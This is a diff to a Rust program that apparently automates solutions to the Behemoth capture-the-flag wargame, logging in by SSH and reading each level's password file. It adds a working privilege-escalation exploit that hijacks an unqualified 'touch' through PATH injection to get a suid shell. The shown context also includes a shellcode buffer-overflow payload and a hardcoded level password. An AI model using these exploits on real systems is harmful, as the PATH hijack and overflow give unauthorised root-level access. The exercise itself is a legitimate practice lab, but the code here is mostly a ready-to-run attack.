@@ -8,9 +8,10 @@ const PORT: usize = 2221;
 
 fn main() -> Result<()> {
 
-    let pass_1 = behemoth0("behemoth0")?;
-    let pass_2 = behemoth1(&pass_1)?;
-    let _pass_3 = behemoth2(&pass_2)?;
+    // let pass_1 = behemoth0("behemoth0")?;
+    // let pass_2 = behemoth1(&pass_1)?;
+    //let pass_3 = behemoth2(&pass_2)?;
+    let _pass_4 = behemoth3("sc5GZjEMld")?;
 
     Ok(())
 }
@@ -26,6 +27,12 @@ fn ssh_session(username: &str, password: &str) -> Result<Session> {
     session.userauth_password(username, password)?;
     println!("connected successfully");
     Ok(session)
+}
+
+fn create_shell(channel: &mut Channel) -> Result<()> {
+    channel.request_pty("xterm", None, Some((80, 24, 0, 0)))?;
+    channel.shell()?;
+    Ok(())
 }
 
 fn read_until(channel: &mut Channel, finished_token: &str) -> Result<String> {
@@ -64,10 +71,9 @@ fn behemoth0(password: &str) -> Result<String> {
     let session = ssh_session("behemoth0", password)?;
 
     let mut channel = session.channel_session()?;
-    channel.request_pty("xterm", None, Some((80, 24, 0, 0)))?;
-    channel.shell()?;
+    create_shell(&mut channel)?;
 
-    let _ = read_until(&mut channel, "behemoth0@gibson:~$ ");
+    read_until(&mut channel, "behemoth0@gibson:~$ ")?;
 
     let test_pass = "test";
 
@@ -86,9 +92,9 @@ fn behemoth0(password: &str) -> Result<String> {
     println!("running '{real_cmd}' to spawn suid shell");
     write_line(&mut channel, &real_cmd)?;
     
-    let _ = read_until(&mut channel, "Password: ")?;
+    read_until(&mut channel, "Password: ")?;
     write_line(&mut channel, &real_pass)?;
-    let _ = read_until(&mut channel, "$ ")?;
+    read_until(&mut channel, "$ ")?;
 
     println!("retrieving /etc/behemoth_pass/behemoth1");
     write_line(&mut channel, "cat /etc/behemoth_pass/behemoth1")?;
@@ -109,10 +115,9 @@ fn behemoth1(password: &str) -> Result<String> {
     let session = ssh_session("behemoth1", password)?;
 
     let mut channel = session.channel_session()?;
-    channel.request_pty("xterm", None, Some((80, 24, 0, 0)))?;
-    channel.shell()?;
+    create_shell(&mut channel)?;
 
-    let _ = read_until(&mut channel, "behemoth1@gibson:~$ ");
+    read_until(&mut channel, "behemoth1@gibson:~$ ")?;
 
     let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
     let jmp_esp = hex::decode("eb04").unwrap(); // jmp 6 (4 + length of instruction, eb 04)
@@ -143,19 +148,50 @@ fn behemoth1(password: &str) -> Result<String> {
     let result = read_until(&mut channel, "behemoth1@gibson:~$ ")?;
     let result: Vec<&str> = result.split("\n").collect();
     let result = result[result.len()-2].trim();
-    println!("retrieved behemoth1 pass '{result}'\n");
+    println!("retrieved behemoth2 pass '{result}'\n");
 
     Ok(result.to_string())
 }
 
 fn behemoth2(password: &str) -> Result<String> {
+    // behemoth2 calls touch unqualified to create a file with the name of its PID. it then waits two seconds before executing the file's contents
+    // while this could be exploited by perhaps writing some command into the file (once the pid is determined), it is simpler to hijack touch via path injection
+
     let session = ssh_session("behemoth2", password)?;
 
     let mut channel = session.channel_session()?;
-    channel.request_pty("xterm", None, Some((80, 24, 0, 0)))?;
-    channel.shell()?;
+    create_shell(&mut channel)?;
 
-    let _ = read_until(&mut channel, "behemoth2@gibson:~$ ");
+    read_until(&mut channel, "behemoth2@gibson:~$ ")?;
+
+    println!("creating a writable tmp folder and moving to it");
+    write_line(&mut channel, "cd $(mktemp -d) && chmod 777 $(pwd)")?;
+    read_until(&mut channel, "$ ")?;
+
+    let exploit = "echo \"/bin/sh\" > touch && chmod +x touch && PATH=. /behemoth/behemoth2";
+    println!("running '{exploit}' to get a suid shell");
+    write_line(&mut channel, &exploit)?;
+    read_until(&mut channel, "$ ")?;
+
+    println!("reading password");
+    write_line(&mut channel, "/bin/cat /etc/behemoth_pass/behemoth3")?;
+    let result = read_until(&mut channel, "$ ")?;
+    let result: Vec<&str> = result.split("\n").collect();
+    let result = result[result.len()-2].trim();
     
-    Ok("".into())
+    println!("retrieved behemoth3 pass '{result}'\n");
+
+    Ok(result.to_string())
+}
+
+fn behemoth3(password: &str) -> Result<String> {
+
+    let session = ssh_session("behemoth3", password)?;
+
+    let mut channel = session.channel_session()?;
+    create_shell(&mut channel)?;
+
+    read_until(&mut channel, "behemoth3@gibson:~$ ")?;
+
+    Ok("".to_string())
 }
